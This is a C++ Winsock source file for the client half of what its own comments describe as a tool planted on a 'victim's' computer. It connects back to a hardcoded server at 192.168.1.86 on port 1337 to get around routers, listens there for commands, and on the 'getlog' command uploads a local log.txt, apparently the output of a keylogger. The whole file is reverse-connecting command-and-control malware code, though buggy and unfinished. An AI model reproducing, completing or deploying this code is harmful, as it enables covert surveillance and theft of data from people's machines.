#pragma once
#include "stdafx.h"
#include <string>
#include <fstream>
#include <iostream>
#include "Client.h"
using namespace std;
/*
This class is used to establish a connection
to our server to upload/download data and receive
commands. We want the client to connect to us instead
of us connecting to them in order to connect to computers
behind routers. This way we don't need to worry about
forwarding any ports on the "victim's" end.
*/

//TODO: Create autoreconnect
void UploadLog(SOCKET csock);
void SendTestMesg(SOCKET csock);
Client::Client(void)
{
	PCSTR host = "192.168.1.86";
	PCSTR port = "1337";
	WSADATA wsaData;
	connectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;

	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if(iResult != 0)
	{
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(1);
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	iResult = getaddrinfo(host, port, &hints, &result);

	if(iResult != 0 )
	{
		printf("getaddrinfo failed with error: %d\n", iResult);
	}

	for(ptr=result; ptr != NULL; ptr=ptr->ai_next)
	{
		connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if(connectSocket == INVALID_SOCKET)
		{
			printf("socket failed with error: %d\n", WSAGetLastError());
			WSACleanup();
			exit(1);
		}

		iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if(iResult == SOCKET_ERROR)
		{
			closesocket(connectSocket);
			connectSocket = INVALID_SOCKET;
			printf("The server is down. Can't connect\n");
		}
		//UploadLog();
		Listen(connectSocket);
	}
}

/*
UploadLog is a function to upload the most recent version of the
log.txt file to our server. 
TODO:
-Implement periodic uploads i.e. once a day
-Keep this client listening for requests to upload
*/
void UploadLog(SOCKET csock)
{
	const int packet_size = 1024;
	string line;
	ifstream file ("log.txt");
	if(file.is_open())
	{
		while(getline(file, line))
		{
			cout << line << '\n';
		}
		file.close();
	} else cout << "Unable to open file";
	char packet_data[packet_size];
	strcpy_s(packet_data, line.c_str());
	send(csock, packet_data, sizeof(packet_data), 0);
	closesocket(csock);
}

//Listens for commands from server in a while loop
//on a sperate thread created by main.cpp.
void Listen(SOCKET csock)
{
	//Commands
	string COMMAND_TESTBACK = "testback";
	string COMMAND_GETLOG = "getlog";
	string input;
	char recvbuf[1024];
	int bytes;
	while(1)
	{
		bytes = recv(csock, recvbuf, 1024, 0);
		if(bytes > 0)
		{
			cout << recvbuf; //For debugging only
			cout << bytes << "\n"; //For debugging only
			input = string(recvbuf);
			for(int i = 0; i < 1024; i++)
			{
				recvbuf[i] = 0;
			}
		}
		if (input == COMMAND_TESTBACK)
		{
			SendTestMesg(csock);
		}
		else if(input == COMMAND_GETLOG)
		{
			UploadLog(csock);
		}
	}
}

//Sends test message to test connection
void SendTestMesg(SOCKET csock)
{
	int ret;
	char sendBuf[] = "Test message.\n";
	ret = send(csock, sendBuf, (int)strlen(sendBuf), 0);
	if(ret == SOCKET_ERROR)
	{
		printf("Send failed: %d\n", WSAGetLastError());
		closesocket(csock);
		WSACleanup();
		exit(1);
	}
	printf("Bytes sent :%ld\n", ret);
}

Client::~Client()
{

}
